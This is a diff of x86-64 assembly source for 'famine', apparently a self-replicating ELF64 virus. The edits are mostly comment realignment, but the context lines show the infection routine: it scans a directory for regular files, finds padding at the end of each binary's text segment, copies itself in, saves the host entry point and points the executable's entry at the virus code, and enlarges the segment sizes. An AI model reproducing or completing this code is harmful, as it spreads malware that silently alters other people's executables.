@@ -1,3 +1,5 @@
+; famine elf64 - size 727 bytes
+
 %include "famine.inc"
 
 bits			64
@@ -6,7 +8,8 @@ global			_start
 section			.text
 
 _host:
-				mov			rax, __NR_exit								; empty program
+	; empty program
+				mov			rax, __NR_exit
 				syscall
 
 _start:
@@ -42,9 +45,9 @@ _start:
 	.file:
 	; look for next regular file and process it
 				lea			rdi, VARS(famine.dirents)
-				add			rdi, r13									; offset in dirent array
+				add			rdi, r13											; offset in dirent array
 				movzx		edx, word [rdi + dirent.d_reclen]
-				mov			al, byte [rdi + rdx - 1]					; file type
+				mov			al, byte [rdi + rdx - 1]							; file type
 				add			rdi, dirent.d_name
 				add			r13, rdx
 				cmp			al, DT_REG
@@ -177,7 +180,7 @@ inject_virus:
 				mov			rdx, qword [rdi + elf64_ehdr.e_entry]
 				movzx		rcx, word [rdi + elf64_ehdr.e_phnum]
 				mov			rax, qword [rdi + elf64_ehdr.e_phoff]
-				add			rdi, rax									; code segment Elf64_Phdr
+				add			rdi, rax											; code segment Elf64_Phdr
 				mov			r14, rdi
 	.segment:
 				cmp			rcx, 0
@@ -189,7 +192,7 @@ inject_virus:
 				cmp			rdx, rax
 				jb			.next
 				add			rax, qword [rdi + elf64_phdr.p_memsz]
-				mov			r13, rax									; new entry point
+				mov			r13, rax											; new entry point
 				cmp			rdx, rax
 				jl			.find_space
 	.next:
@@ -200,8 +203,8 @@ inject_virus:
 	; abort if not enough empty bytes in text segment to write virus
 				mov			rax, qword [rdi + elf64_phdr.p_offset]
 				add			rax, qword [rdi + elf64_phdr.p_filesz]
-				lea			rdi, [r15 + rax]							; data + p_offset + p_filesz
-				mov			rsi, rdi									; end of segment
+				lea			rdi, [r15 + rax]									; data + p_offset + p_filesz
+				mov			rsi, rdi											; end of segment
 				xor			al, al
 				mov			rcx, VIRUS_SIZE
 				repz		scasb
@@ -218,13 +221,13 @@ inject_virus:
 				repnz		movsb
 	; save entrypoints
 				mov			rax, qword [r15 + elf64_ehdr.e_entry]
-				mov			qword [rdi - 16], r13						; save virus_entry
-				mov			qword [rdi - 8], rax						; save host_entry
+				mov			qword [rdi - 16], r13								; save virus_entry
+				mov			qword [rdi - 8], rax								; save host_entry
 	; update binary headers
-				mov			qword [r15 + elf64_ehdr.e_entry], r13		; set new entrypoint to virus
+				mov			qword [r15 + elf64_ehdr.e_entry], r13				; set new entrypoint to virus
 				mov			rax, VIRUS_SIZE
-				add			qword [r14 + elf64_phdr.p_filesz], rax		; increase p_filesz
-				add			qword [r14 + elf64_phdr.p_memsz], rax		; increase p_memsz
+				add			qword [r14 + elf64_phdr.p_filesz], rax				; increase p_filesz
+				add			qword [r14 + elf64_phdr.p_memsz], rax				; increase p_memsz
 	.return:
 				pop			r15
 				pop			r14
